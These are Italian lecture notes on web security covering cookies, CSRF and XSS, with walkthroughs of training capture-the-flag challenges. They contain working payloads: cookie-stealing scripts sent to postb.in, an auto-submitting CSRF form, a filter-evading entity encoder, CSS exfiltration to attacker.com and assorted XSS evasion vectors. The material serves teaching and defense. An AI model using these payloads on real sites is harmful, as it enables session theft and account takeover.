3. Ricaricando la pagina, il sistema autentica l'utente come amministratore.
    

![[Pasted image 20260131135925.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:**
> 
> 1. Nel pannello di destra (Application/Cookies), il valore di `user` è `newman`.
>     
> 2. Nel pannello principale, appare l'immagine di John Hammond ("We spared no expense").
>     
> 3. In basso appare il **Result**: `WIT{XXXX}` (il flag della challenge).
>     
> 
> **Meaning:** La modifica del cookie non protetto ha permesso l'escalation dei privilegi e la risoluzione della challenge.

---

## 3. Recap: SOP vs JSON-P vs CORS

Questa sezione riassume le differenze fondamentali tra le politiche di sicurezza e i metodi di comunicazione cross-origin.

### Same Origin Policy (SOP)

- Definisce il concetto di **Origin** come la tripla `(protocol, hostname, port)`.
    
- **Restrizioni:** Blocca l'accesso al DOM e le richieste di rete verso origini diverse.
    
- **Eccezioni:** NON restringe l'inclusione di contenuti (es. scripts, immagini).
    
- **Comportamento con i Cookie:** È più "rilassata" quando gestisce i cookie.
    

### Come eseguire una richiesta network cross-origin (A -> B)?

#### 1. JSON-P (JSON with Padding)

Definito nelle slide come una **"hack technique"**.

- **Idea:** Includere uno script il cui contenuto è generato dinamicamente da B.
    
- **Funzionamento:** Quando eseguito da A, lo script invia dati a una funzione definita in A.
    
- **Risultato:** In pratica, A può ricevere dati da B aggirando la SOP tramite il tag `<script>`.
    

#### 2. CORS (Cross-Origin Resource Sharing)

Definito come il **"proper way"** (modo corretto).

- **Funzionamento:** Il browser permette ad A di leggere la risposta da B **solo se** B mette esplicitamente in whitelist A usando un header CORS (es. `Access-Control-Allow-Origin`).
    

---

## 4. Recap: Cookies Attributes

Vengono riepilogati i principali attributi dei cookie che ne influenzano la sicurezza e lo scope.

- **Domain:**
    
    - Quando impostato, il cookie può essere acceduto anche dai **related domains** (sottodomini).
        
    - Conseguenza: un cookie potrebbe essere accessibile da origini diverse che condividono lo stesso **registrable domain**.
        
- **Path:**
    
    - Quando impostato, l'accesso al cookie è limitato in base al percorso URL.
        
- **Secure:**
    
    - Quando impostato, il cookie viene inviato solo se si usa **HTTPS**.
        
- **HttpOnly:**
    
    - Quando impostato, il codice **JavaScript non può accedere** al cookie.
        
- **SameSite:**
    
    - Controlla se un cookie viene allegato in caso di **cross-site request**.
        
    - **Nota importante:** Qui "site" indica un **registrable domain** (es. `a.foo.com` e `b.foo.com` sono lo stesso "site": `foo.com`).
        

> [!abstract] Nota sulla SOP e Cookie
> 
> Il browser non ragiona sulla "SOP origin" standard per i cookie, ma adatta le regole in modo diverso (come visto nelle slide precedenti sull'argomento).

---

## 5. Recap: Problemi di Sicurezza dei Cookie

La gestione dei cookie presenta diverse criticità strutturali e implementative.

### Gestione del Cookie Jar

Il Cookie Jar è organizzato basandosi sulla tupla `(name, domain, path)`. Tuttavia, la sua gestione è specifica del browser ("browser specific").

1. **Cookie Tossing Attack:**
    
    - Scenario: Il sottodominio A imposta un cookie X che può essere acceduto dal sottodominio B (tramite l'attributo Domain).
        
    - Problema: Se B aveva già un cookie chiamato X, cosa succede?
        
    - Exploit: Il browser definisce un **"ordine"** sui cookie e l'attaccante può sfruttare questo ordine per far prevalere il cookie malevolo su quello legittimo.
        
2. **Cookie Jar Overflow:**
    
    - Scenario: Dato un cookie X con attributo `HttpOnly`, il codice JavaScript non dovrebbe poter cambiare il suo valore.
        
    - Exploit: Un attaccante può generare un **gran numero di cookie**, forzando il browser a **scartare** il cookie X (per limiti di spazio). Successivamente, l'attaccante può reimpostare arbitrariamente X usando JavaScript.
        

### Limitazioni del Protocollo

- Quando un cookie viene inviato in una richiesta, viene inviata **solo la coppia `name=value`**.
    
- **Problema:** Il server **non è a conoscenza** e non può verificare gli attributi del cookie presenti nel client (es. non può rifiutare il cookie se `httpOnly` è falso o se il dominio non è quello atteso).
    

### Cross-site Leakage

Le richieste cross-site possono far trapelare il contenuto di un cookie quando l'attributo **SameSite** non è impostato correttamente.

# Web Security: CSRF & Defenses

**Tags:** #ingegneria #sicurezza_informatica #web_security #CSRF #token #Fetch_Metadata

## 1. Cross Site Request Forgery (CSRF)

L'attacco **CSRF** (Cross Site Request Forgery) sfrutta l'inclusione automatica dei cookie alle richieste effettuate dai browser per eseguire azioni arbitrarie all'interno della sessione stabilita dalla vittima con il sito web target.

![[Pasted image 20260131135952.png]]![[Pasted image 20260131140040.png]]![[Pasted image 20260131140051.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** Un utente autenticato su un sito vulnerabile visita un sito malevolo che scatena una richiesta automatica (es. cambio email).
> 
> **Meaning:**
> 
> 1. Vittima visita `evil-user.net`.
>     
> 2. Senza interazione, parte una richiesta verso `vulnerable-website.com`.
>     
> 3. L'azione (cambio email) viene eseguita perché il browser ha allegato i cookie di sessione validi.
>     

### Meccanismo dell'attacco

1. **Presupposto:** La vittima è autenticata sul sito web target.
    
2. **Innesco:** La vittima visita il sito web dell'attaccante.
    
3. **Richiesta forgiata:** La pagina dell'attaccante innesca una richiesta verso il sito della vittima:
    
    - Tramite **form** inviati automaticamente via JavaScript (per richieste **POST**).
        
    - Tramite il caricamento di un'**immagine** (per richieste **GET**).
        
4. **Risultato:** Il cookie che identifica la sessione viene **automaticamente allegato** dal browser.
    

---

## 2. Esempio di Attacco CSRF

Le slide mostrano un esempio pratico di attacco contro `bank.com`.

### Scenario 1: Login legittimo (POST)

L'utente Alice effettua il login legittimo.

**Here is the exact implementation shown in the slides:**

```http
POST /login
Host: bank.com
user=alice&pass=mypwd

200 OK
Set-Cookie: session=XYZ; Secure; HttpOnly
```

### Scenario 2: Attacco CSRF tramite GET (Image Tag)

L'attaccante usa un tag `<img>` per scatenare una richiesta GET verso l'endpoint di trasferimento denaro.

**Here is the exact implementation shown in the slides:**

```html
<HTML>
<BODY>
<IMG src="https://bank.com/?act=attacker&amt=3000">
</BODY>
</HTML>
```

**Flusso HTTP:**

1. Il browser della vittima carica l'immagine.
    
2. Invia una richiesta GET a `bank.com`.
    
3. Include automaticamente `Cookie: session=XYZ`.
    
4. Il server risponde `200 OK` e il trasferimento viene eseguito.
    

**Problema:** `bank.com` non può distinguere le richieste legittime da quelle innescate da un sito di terze parti.

---

## 3. Difese CSRF: Anti-CSRF Tokens

La difesa principale consiste nell'uso di token casuali segreti che l'attaccante non può conoscere.

### Synchronizer token pattern (Forms)

- Una stringa segreta e generata casualmente viene incorporata in tutti i form HTML come campo nascosto (`hidden input field`).
    
- All'invio del form, l'applicazione verifica la presenza e la correttezza del token.
    

**Here is the exact implementation shown in the slides:**

```html
<INPUT type="hidden" value="ak34F9dmAvp">
```

### Cookie-to-header token (JavaScript)

- Un cookie con un token generato casualmente viene impostato alla prima visita.
    
- JavaScript legge il valore del cookie e lo inserisce in un **HTTP header personalizzato**.
    
- Il server verifica che l'header sia presente e che il suo valore corrisponda a quello del cookie.
    

**Here is the exact implementation shown in the slides:**

```http
Set-Cookie: _Host-CSRF_token=aen4GjH9b3s; Path=/; Secure
```

### Progettazione dei Token CSRF

- **Generazione:**
    
    - _Refreshed at every page load:_ Limita il tempo in cui un token trapelato (es. via XSS) è valido.
        
    - _Generated once on session setup:_ Migliora l'usabilità (es. navigazione su più tab) ma è meno sicuro del precedente.
        
- **Vincolo:** I token devono essere legati a una **specifica sessione utente** per impedire che un attaccante usi un token valido ottenuto dal proprio account.
    

> [!abstract] Nota
> 
> La maggior parte dei moderni framework web utilizza token anti-CSRF per impostazione predefinita.

---

## 4. Referer Validation

Un'altra tecnica difensiva è la validazione dell'header `Referer`.

- I browser allegano automaticamente l'header `Referer` alle richieste in uscita, indicando la pagina di origine.
    
- L'applicazione web ispeziona questo header per verificare se la richiesta proviene da un dominio consentito.
    

**Esempio di richiesta valida:**

```http
POST /login HTTP/2
Host: example.com
Referer: https://example.com/index
user=sempronio&pass=s3cr3tpwd
```

### Caveat (Limiti) della Referer Validation

L'header `Referer` può essere soppresso o mancare per vari motivi:

- Filtrato da firewall aziendali.
    
- Rimosso dalla macchina locale o dal browser (es. transizioni HTTPS -> HTTP).
    
- Preferenze utente.
    

**Tipi di validazione:**

1. **Lenient:** Accetta richieste senza header (rischio vulnerabilità).
    
2. **Strict:** Rifiuta richieste senza header (rischio blocco utenti legittimi).
    

---

## 5. Altre Mitigazioni: SameSite Cookie & Fetch Metadata

### SameSite Cookie Attribute

Offre una mitigazione efficace contro attacchi CSRF classici.

- **Default:** `SameSite = Lax` (protegge dai "classic web attackers").
    
- **Limite:** Nessuna protezione contro attacchi da **related-domain attackers**, poiché le richieste dal dominio dell'attaccante (se sottodominio) sono considerate same-site.
    

### Fetch Metadata

Fornisce al server informazioni sul **contesto** in cui una richiesta è stata generata, permettendo di scartare richieste sospette.

- Supportato attualmente solo dai browser basati su Chromium.
    
- Inviato solo su HTTPS.
    

**Principali Header:**

- `Sec-Fetch-Dest`: Destinazione della richiesta (es. `image`, `script`, `document`).
    
- `Sec-Fetch-Mode`: Modalità della richiesta (es. `Maps`, `cors`).
    
- `Sec-Fetch-Site`: Relazione tra l'origine dell'iniziatore e quella del target (`cross-site`, `same-site`, `same-origin`).
    
- `Sec-Fetch-User`: Inviato se la richiesta è scatenata da un'azione utente.
    

**Policy di Esempio (Resource Isolation):**

$$Sec\text{-}Fetch\text{-}Site == \text{'cross-site'} \land (Sec\text{-}Fetch\text{-}Mode \neq \text{'navigate'/'nested-navigate'} \lor method \notin [GET, HEAD])$$

> [!abstract] Math Analysis
> 
> Questa regola logica dice: Se la richiesta è cross-site E (non è una navigazione OPPURE il metodo non è sicuro come GET/HEAD), allora blocca o isola la risorsa.

---

## 6. Training Challenge #06: "You are not authorized"

Un caso di studio pratico per applicare i concetti di CSRF.

- **URL:** `https://training06.webhack.it`
    
- **Descrizione:** "You are not authorized... Are you?"
    

### Analisi della Challenge

![[Pasted image 20260131140230.png]]

1. **Homepage:** Mostra un contenuto ad accesso limitato ("IT'S A SECRET... UR NOT AUTHORIZED").
    
2. **Admin Panel (`/admin`):**
    
    - Mostra l'utente corrente: `coppa@diag.uniroma1.it`.
        
    - Funzionalità visibili: "Grant access", "Deny access", "Add user", "Delete user".
        
    - Form per "Grant temporary access" all'URL `/admin/grant` che richiede un **UID**.
        
    - **Vincolo:** Solo l'admin può eseguire queste azioni. Se proviamo a inviare il nostro UID, riceviamo: _"Only admin can perform this action!"_.
        
3. **Report Page (`/report`):**
    
    - Permette di inviare un report su una pagina corrotta ("Send report about broken page").
        
    - Richiede un **URL**.
        

### Identificazione del Problema

- L'amministratore probabilmente visiterà l'URL che segnaliamo nella pagina `/report`.
    
- Se riusciamo a far visitare all'admin una pagina che scatena una richiesta verso `/admin/grant` con il nostro UID, potremmo ottenere l'accesso (CSRF).
    

### Soluzione (Exploit)

Creiamo una pagina HTML malevola (ospitata ad esempio tramite `ngrok` e un server locale Python) che contiene un form auto-inviante verso l'endpoint vulnerabile.

**Here is the exact implementation shown in the slides:**

```html
<!DOCTYPE html>
<html lang="en">
<body>
<form method="post" action="https://training06.webhack.it/admin/grant">
<input type="hidden" name="uid" value="${PUT_HERE_YOUR_UID}"> </form>
<script>
document.forms[0].submit();
</script>
</body>
```

**Procedura:**

1. Ospitare la pagina HTML sopra.
    
2. Inviare l'URL della nostra pagina malevola (es. `https://....ngrok.io`) tramite il form di report.
    
3. L'admin visita il nostro link.
    
4. Il JavaScript nella nostra pagina esegue automaticamente il `submit()` del form verso `training06.webhack.it`.
    
5. Il browser dell'admin esegue la richiesta POST includendo i suoi cookie di sessione.
    
6. L'accesso viene garantito. Visitando la homepage, vedremo il flag `WIT{...}`.

![[Pasted image 20260131140257.png]]

---

# Web Security: Cross Site Scripting (XSS)

**Tags:** #ingegneria #sicurezza_informatica #web_security #XSS #injection

## 1. Cross Site Scripting (XSS)

Il **Cross Site Scripting (XSS)** è una vulnerabilità di tipo **code injection**.

- **Definizione:** L'attaccante riesce a iniettare codice JavaScript nelle pagine di un'applicazione web. Questo codice viene poi eseguito nel browser della vittima.
    
- **Causa principale (Root cause):** Impropria **sanitizzazione** (sanitization) degli input utente prima che vengano incorporati nella pagina.
    

![[Pasted image 20260131140343.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** Un diagramma mostra l'attaccante che invia un link malevolo alla vittima (es. via email). Il link punta a `insecure-website.com` e contiene un payload: `<script src=https://evil-user.net/badscript.js></script>`.
> 
> **Meaning:**
> 
> 1. La vittima clicca sul link.
>     
> 2. Il browser carica la pagina vulnerabile che esegue lo script malevolo.
>     
> 3. Lo script esfiltra dati sensibili (Password, Dati Sensibili, Bonifici, Nome da nubile della madre) verso l'attaccante.
>     

---

## 2. Tipologie di XSS

Esistono tre tipi principali di vulnerabilità XSS:

1. **Reflected XSS:** I dati provenienti dalla richiesta vengono incorporati dal server nella pagina web.
    
2. **Stored XSS:** Il payload è memorizzato permanentemente lato server (es. nel database dell'applicazione web).
    
3. **DOM-based XSS:** Il payload è incorporato in modo non sicuro nella pagina web lato browser (browser-side).
    

---

## 3. Reflected XSS

Nel Reflected XSS, il sito web include i dati della richiesta HTTP in ingresso nella pagina web senza una corretta sanitizzazione.

- **Meccanismo di attacco:**
    
    - L'utente viene ingannato a visitare un sito web onesto tramite un URL preparato dall'attaccante (es. email di phishing, reindirizzamento dal sito web dell'attaccante).
        
    - Lo script iniettato può manipolare i contenuti del sito web (**DOM**) per mostrare informazioni false, esfiltrare dati sensibili (es. cookie di sessione), ecc.
        

### Esempio #1: Redirect

![[Pasted image 20260131140403.png]]

1. La vittima visita `evil.com`.
    
2. `evil.com` risponde con un reindirizzamento (`302 FOUND`) verso il sito vulnerabile `example.com`, includendo il payload nel parametro `q`.
    

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

HTTP

```
302 FOUND
Location:
https://example.com/?q=<SCRIPT>alert(1)</SCRIPT>
```

> [!abstract] Code Analysis
> 
> Il server dell'attaccante forza il browser della vittima a navigare verso `example.com` portando con sé lo script malevolo nell'URL.

### Esempio #2: Riflessione del Payload
![[Pasted image 20260131140413.png]]
![[Pasted image 20260131140417.png]]

1. Il browser invia la richiesta GET a `example.com` con il payload: `GET /?q=<SCRIPT>alert(1)</SCRIPT>`.
    
2. Il server `example.com` risponde con `200 OK` e restituisce il codice HTML che include l'input utente **non sanitizzato**.
    

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```html
<HTML>
You searched:
<SCRIPT>alert(1)</SCRIPT>
</HTML>
```

> [!abstract] Code Analysis
> 
> Il server riflette ("reflects") esattamente ciò che ha ricevuto nel parametro `q` all'interno del corpo HTML. Il browser interpreta `<SCRIPT>alert(1)</SCRIPT>` come codice eseguibile e lancia l'alert.


> [!abstract] Visual Analysis
> 
> **What to look at:** Il flusso circolare tra il laptop della vittima, il server `evil.com` e il server `example.com` (o `a.com`).
> 
> **Meaning:**
> 
> 1. La richiesta malevola può essere attivata visitando un sito controllato dall'attaccante.
>     
> 2. Il server riflette l'input dell'utente all'interno della pagina senza adeguata sanitizzazione.

# Web Security: Challenges & Stored XSS

**Tags:** #ingegneria #sicurezza_informatica #web_security #XSS #stored_xss #CTF #training

## 1. Training Challenge #07: The cWo

Questa challenge introduce uno scenario pratico in un'applicazione di chat.

- **URL:** `https://training07.webhack.it`
    
- **Contesto:** L'organizzazione "cWo" (Cauliflowers) sembra gestire la sicurezza tramite un appaltatore esterno. L'obiettivo è ottenere un accesso maggiore recuperando le credenziali.
    

### Analisi dell'Applicazione

L'applicazione è una **chat** dove possiamo interagire con un "Admin".

- L'admin risponde ai messaggi.
    
- È possibile utilizzare codice **HTML** nei messaggi.
    

> [!abstract] Visual Analysis
> 
> **What to look at:** L'interfaccia della chat mostra messaggi scambiati tra "Admin" e l'utente "brewtoot".
> 
> **Meaning:**
> 
> - L'utente invia `<b>ciao</b>`.
>     
> - Il messaggio viene renderizzato come **grassetto** (bold) nella chat.
>     
> - Questo conferma che l'input utente viene interpretato come HTML (HTML Injection).
>     

### Il Problema

Poiché il messaggio viene renderizzato dall'admin, esiste la possibilità di eseguire codice JavaScript nel browser dell'admin (XSS).

1. **Tentativo Base:** Se si prova a inserire semplice codice JavaScript, l'applicazione di chat lo **filtra**.
    
2. **Obiettivo:** Aggirare il filtro per eseguire codice malevolo e rubare i **cookie** dell'admin.
    

### Soluzione: Encoding

Per aggirare il filtro, è necessario codificare il payload in modo inaspettato per il filtro ma comprensibile per il browser.

#### Setup dell'Attaccante

Prima di lanciare l'attacco, è necessario un server HTTPS funzionante per ricevere la richiesta con i cookie rubati.

- Si può usare un servizio come `postb.in` o `requestbin.com`.
    

#### Codice dell'Exploit
L'obiettivo è iniettare il seguente payload logico:

```JavaScript
javascript:document.location='https://postb.in/YOUR_BIN_ID?cookie='+document.cookie;
```

Poiché il codice JavaScript è filtrato, si utilizza uno script Python per offuscare il payload usando **HTML Entities** con padding numerico.

**Here is the exact implementation shown in the slides:**

```Python
import sys
print("<img src=x onerror=", end="")
for x in sys.argv[1]:
    char_val = str(ord(x))
    padding = 7 - len(char_val)
    print(f"&#" + "0" * padding + char_val, end="", flush=True)
print("\">")
```

> [!abstract] Code Analysis
> 
> - Il payload viene inserito in un gestore eventi `onerror` di un tag `<img>` invalido (`src=x`).
>     
> - Ogni carattere del payload JavaScript viene convertito nel suo valore ASCII (`ord(x)`).
>     
> - Viene applicato un padding di zeri per raggiungere una lunghezza fissa (es. `&#0000106` per il carattere 'j').
>     
> - Questo encoding spesso aggira i filtri basati su firme (signature-based) che cercano parole chiave specifiche come `javascript:`.
>     

#### Esecuzione e Risultato

1. Si esegue lo script Python passando il payload JavaScript desiderato.
    
2. Si copia l'output generato nella chat.
    
3. L'admin visualizza il messaggio, il tag `<img>` fallisce il caricamento, scatta `onerror`, il codice decodificato viene eseguito.
    
4. Nel `postb.in` compare una richiesta GET contenente il cookie: `flag=WIT{...}`.
![[Pasted image 20260131141446.png]]

---

## 2. Stored XSS

Il **Stored XSS** (o Persistent XSS) è una variante in cui i dati malevoli vengono salvati permanentemente dal server.

### Concetto Chiave

- Il sito web riceve dati da una sorgente non fidata e li **memorizza** (es. in un database, file system, log).
    
- Esempi tipici: social network, blog, forum, wiki.
    
- **Vettori:** Un attaccante incorpora uno script come parte di un commento in un forum.
    
- **Esecuzione:** Quando un visitatore (vittima) carica la pagina che visualizza quel contenuto, il browser esegue lo script.
    
- **Differenza critica:** Non è richiesta alcuna interazione diretta tra l'attaccante e la vittima (a differenza del Reflected XSS dove la vittima deve cliccare un link).

### Esempio 1
![[Pasted image 20260131141503.png]]
![[Pasted image 20260131141513.png]]

### Esempio 2

![[Pasted image 20260131141542.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:**
> 
> 1. Attaccante invia `POST /thread/1` con `msg=<SCRIPT>alert(1)</SCRIPT>`.
>     
> 2. Server `forum.com` salva il messaggio nel database.
>     
> 3. Vittima richiede `GET /thread/1`.
>     
> 4. Server include il messaggio salvato nell'HTML restituito.
>     
> 5. Il browser della vittima esegue l'alert.
>     
> 
> **Meaning:** Il payload è persistente e colpisce chiunque visualizzi la pagina infetta.

---

## 3. Training Challenge #08: Pasteurize
![[Pasted image 20260131140535.png]]
![[Pasted image 20260131140606.png]]
![[Pasted image 20260131140703.png]]
![[Pasted image 20260131140906.png]]![[Pasted image 20260131140912.png]]
![[Pasted image 20260131140923.png]]![[Pasted image 20260131140936.png]]![[Pasted image 20260131140945.png]]![[Pasted image 20260131140952.png]]

Questa challenge simula un servizio di "Pastebin" personalizzato.

- **URL:** `https://training08.webhack.it`
    
- **Funzionalità:** Permette di creare un nuovo "paste" (nota) e condividerlo con un utente chiamato "TJMike".
    

### Analisi del Codice e Vulnerabilità

Analizzando il codice sorgente della pagina dove viene visualizzato il paste, si nota come viene gestita la sanitizzazione.

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

JavaScript

```
<script>
const note = "asaas";
const note_id = "3b7b2f42-36e4-4298-975e-5127d9565fc3";
const note_el = document.getElementById('note-content');
const note_url_el = document.getElementById('note-title');
const clean = DOMPurify.sanitize(note);
note_el.innerHTML = clean;
note_url_el.href = "/note/3b7b2f42-36e4-4298-975e-5127d9565fc3";
note_url_el.innerHTML = "3b7b2f42-36e4-4298-975e-5127d9565fc3";
</script>
```

> [!abstract] Code Analysis
> 
> - L'input dell'utente (`const note = "..."`) viene inserito direttamente all'interno di un blocco `<script>`.
>     
> - Anche se successivamente viene usata `DOMPurify.sanitize(note)` per pulire l'HTML prima di inserirlo nel DOM (`note_el.innerHTML`), la vulnerabilità risiede nella riga iniziale: `const note = "INPUT_UTENTE";`.
>     
> - Il server inserisce l'input "as is" (così com'è) dentro una stringa JavaScript.
>     

### Soluzione: Breaking out of the String

Poiché l'input è dentro una stringa delimitata da doppi apici, possiamo "rompere" la stringa e iniettare codice JavaScript arbitrario.

#### Payload di Test

JavaScript

```
"; alert(1); //
```

- `";` chiude la stringa e l'istruzione precedente.
    
- `alert(1);` è il comando iniettato.
    
- `//` commenta il resto della riga originale (il chiudi-virgolette e punto e virgola originali).
    

#### Payload Finale (Stealing Cookies)

Per rubare i cookie e inviarli al nostro server (es. `postb.in`):

JavaScript

```
"; window.location = 'https://postb.in/YOUR_BIN_ID?' + document.cookie; //
```

### Procedura di Attacco (Exploitation Flow)

L'attacco richiede di far visualizzare il paste malevolo alla vittima (TJMike). Poiché la funzionalità di condivisione ("share with TJMike") potrebbe non permettere l'invio diretto del nostro paste malevolo o richiede passaggi specifici, si usa **Burp Suite** per manipolare la richiesta.

1. **Creare il Payload:** Creare un paste con il codice JavaScript malevolo (Payload Finale). Ottenere l'**ID** di questo paste malevolo.
    
2. **Creare un Paste Benigno:** Creare un paste normale (senza payload).
    
3. **Intercettare la Segnalazione:** Usare la funzionalità "share with TJMike" sul paste benigno e intercettare la richiesta POST con Burp Suite (o inviarla al Repeater).
    
4. **ID Swap (Scambio ID):** Nella richiesta intercettata, sostituire l'ID del paste benigno con l'**ID del paste malevolo**.
    

#### Analisi della Richiesta Manipolata

**Here is the exact implementation shown in the slides:**

HTTP

```
POST /report/ee31731c-bfd7-4089-b4de-4548d15cf799 HTTP/2
Host: training08.webhack.it
Cookie: challenge_auth_token=...
...
```

> [!abstract] Visual Analysis
> 
> **What to look at:** Lo screenshot di Burp Repeater mostra l'URL della richiesta POST `/report/UUID`.
> 
> **Meaning:** Si invia al bot (TJMike) l'istruzione di visitare il report identificato dall'UUID malevolo.

5. **Risultato:** TJMike visita il paste malevolo. Il browser esegue il JavaScript iniettato (poiché rompe la stringa `const note`). Viene effettuato il redirect verso `postb.in` con i cookie appesi nell'URL.
    
6. **Flag:** Il flag `WIT{...}` appare nei log di `postb.in`.

# Web Security: DOM-based XSS & Prevention

**Tags:** #ingegneria #sicurezza_informatica #web_security #XSS #DOM_based_XSS #prevenzione

## 1. DOM-based XSS

Nel **DOM-based XSS**, i dati provenienti da una sorgente controllabile dall'attaccante (es. l'URL) vengono inseriti in un **sensitive sink** o in API del browser senza un'adeguata sanitizzazione.

- **Caratteristica fondamentale:** L'iniezione di codice pericoloso è eseguita da codice JavaScript vulnerabile.
    
- **Visibilità:** Il server potrebbe **non vedere mai** il payload dell'attaccante.
    
- **Conseguenza:** Le tecniche di rilevamento lato server (server-side detection) non funzionano.
    

### Componenti Chiave

Le slide classificano gli elementi coinvolti in **Sources** (Sorgenti) e **Sinks** (Punti di destinazione/esecuzione).

**Popular Sources (Sorgenti Comuni):**

- `document.URL`
    
- `document.documentURI`
    
- `location.href`
    
- `location.search`
    
- `location.*` (altre proprietà di location)
    
- `window.name`
    
- `document.referrer`
    

**Popular Sinks (Sinks Comuni):**

- **HTML Modification sinks** (Modificano l'HTML della pagina):
    
    - `document.write`
        
    - `(element).innerHTML`
        
- **HTML modification to behaviour change** (Modifica comportamentale):
    
    - `(element).src` (in certi elementi)
        
- **Execution Related sinks** (Eseguono codice):
    
    - `eval`
        
    - `setTimeout` / `setInterval`
        
    - `execScript`
        

---

## 2. Esempio di DOM-based XSS

Il DOM XSS si verifica quando uno dei sink di iniezione nel DOM o altre API del browser viene chiamato con dati controllati dall'utente.

#### Sezione Implementazione

Consideriamo questo snippet che carica un foglio di stile per un determinato template.

**Here is the exact implementation shown in the slides:**

```JavaScript
const templateId = location.hash.match(/tplid=([^;]*)/)[1];
// ...
document.head.innerHTML += '<link rel="stylesheet" href="./templates/${templateId}/style.css">';
```

> [!abstract] Code Analysis
> 
> - **Sorgente:** `location.hash` (controllato dall'utente/attaccante).
>     
> - **Logica:** Viene estratto il valore di `tplid` tramite una regex.
>     
> - **Sink:** `document.head.innerHTML` (permette l'inserimento di HTML arbitrario).
>     
> - **Vulnerabilità:** Il codice collega direttamente la sorgente al sink senza sanitizzazione.
>     

### Exploit

L'attaccante può sfruttare questo codice costruendo un URL malevolo che chiude il tag e ne apre uno nuovo.

**Esempio di URL malevolo:**

`https://example.com#tplid="><img src=x onerror=alert(1)>`

---

## 3. CSS Injection (Non solo script)

Mentre gli script rappresentano la minaccia più pericolosa, l'iniezione di altri contenuti può causare seri problemi di sicurezza.

- **CSS Injection:** Può essere utilizzata per esfiltrare (leak) valori segreti presenti nel DOM della pagina (es. **CSRF tokens**).
    

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```HTML
<HTML>
<STYLE>
	input[name=csrf] [value^=a] ~ * {
	background-image: url(http://attacker.com/?v=a);
}
input[name=csrf] [value^=b] ~ * {
	background-image: url(v=b);
}
/* ... */
input[name=csrf] [value^=9] ~ * {
	background-image: url(v=9);
}
</STYLE>
/* ... */
<FORM>
...
<INPUT type="hidden" name="csrf" value="s3cr3t">
...
</FORM>
</HTML>
```

> [!abstract] Code Analysis
> 
> - **Selettori CSS:** Utilizza selettori di attributo come `[value^=a]` (inizia con 'a').
>     
> - **Meccanismo:** Se il valore del token inizia con una certa lettera, il browser applica lo stile corrispondente.
>     
> - **Esfiltrazione:** Lo stile imposta un `background-image` che punta al server dell'attaccante (`http://attacker.com/?v=a`). Quando il browser tenta di caricare l'immagine, invia una richiesta all'attaccante rivelando il carattere corrispondente.
>     

## A nice homework
f you want to practice with XSS, play with
https://xss-game.appspot.com
![[Pasted image 20260131141850.png]]

---

## 4. Prevenzione XSS

Qualsiasi input utente deve essere pre-processato prima di essere utilizzato all'interno della pagina.

### Regole Fondamentali

1. **Encoding:** I caratteri speciali HTML devono essere correttamente codificati (encoded) prima dell'inserimento.
    
2. **Contesto:** Diversi encoding o filtraggi sono richiesti a seconda della posizione (es. all'interno di un attributo HTML vs all'interno di un blocco `<div>`).
    
3. **No Manual Escaping:** Non fare l'escaping manualmente!
    

### Librerie Consigliate

Usa librerie di escaping affidabili:

- **OWASP ESAPI** (Enterprise Security API).
    
- **Microsoft's AntiXSS**.
    
- **DOMPurify** (specifico per client-side).
    

### Templating Libraries

Affidarsi a librerie di templating che forniscono funzionalità di escaping integrate:

- **Smarty** e **Mustache** (PHP).
    
- **Jinja** (Python).
    

### Difesa Specifica per DOM-based XSS

- Utilizzare i **Trusted Types**.
    

---

## 5. XSS Auditor in Chrome

![[Pasted image 20260131141916.png]]

Le slide menzionano uno strumento storico di Chrome, ora rimosso.

- **Stato:** Deprecato e rimosso (da Chrome 78 nel 2019).
    
- **Funzionamento:** Eseguiva durante la fase di parsing HTML e tentava di trovare riflessioni dalla richiesta al corpo della risposta.
    
- **Limiti:** Non tentava di mitigare XSS Stored o DOM-based.
    
- **Motivo della rimozione:** Bypass non risolti e falsi positivi. Aveva costi di performance se l'URL o il corpo POST includevano caratteri specifici (`<`, `>`).
    

---

## 6. Problemi con i Filtri (Caveats)

I filtri semplici possono essere aggirati facilmente se non implementati correttamente (spesso usando espressioni regolari costose o logiche fallaci).

**Esempio di Bypass (Rimozione singola):**

Se il filtro rimuove la stringa `<script` una sola volta:

- Input: `<scr<scriptipt src="...">`
    
- Risultato dopo filtro: `<script src="...">` (il filtro rimuove la parte centrale e ricompone la stringa malevola).
    
- **Soluzione necessaria:** Bisognerebbe ciclare e riapplicare il filtro finché non viene trovato nulla.
    

**Vettori Alternativi:**

Il tag `<script>` potrebbe non essere necessario per un XSS.

**Here is the exact implementation shown in the slides:**

```HTML
<A href="INJECTION_HERE">
<A href="#" onclick="alert(1)">
```

---

## 7. Varianti di XSS (Many Flavors)

Esistono molti modi per eseguire codice JavaScript, alcuni dipendenti dal browser specifico.

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```HTML
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>

<body onbeforeprint=alert(1)>

<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />

<style>:target {color: red;}</style><xss id=x style="transition:color 10s"
 ontransitioncancel=alert(1)></xss>
 
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>

<embed src="javascript:alert(1)">

<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>
```

> [!abstract] Code Analysis
> 
> Questi payload dimostrano l'uso di:
> 
> - Eventi CSS (`onanimationend`, `ontransitioncancel`).
>     
> - Eventi del corpo (`onbeforeprint`).
>     
> - Tag SVG (`<animate>`).
>     
> - Tag `embed` e `iframe` con `srcdoc`.
>     
> - Offuscamento JavaScript (`\x28` per parentesi aperta).
>     

---

## 8. Evasione dei Filtri XSS

Esistono risorse online ("Cheat sheets") che elencano vettori per aggirare WAF (Web Application Firewall) e filtri.

- Alcuni trucchi sono specifici per browser.
    
- Altri sono specifici per librerie di templating JS.
    
- Risorsa citata: **PortSwigger Cross-site scripting (XSS) cheat sheet**.
    

![[Pasted image 20260131142007.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** Lo screenshot mostra una tabella interattiva (Cheat Sheet).
> 
> **Meaning:**
> 
> - Permette di filtrare per **Event handlers** (gestori eventi), **Tags** e **Browsers**.
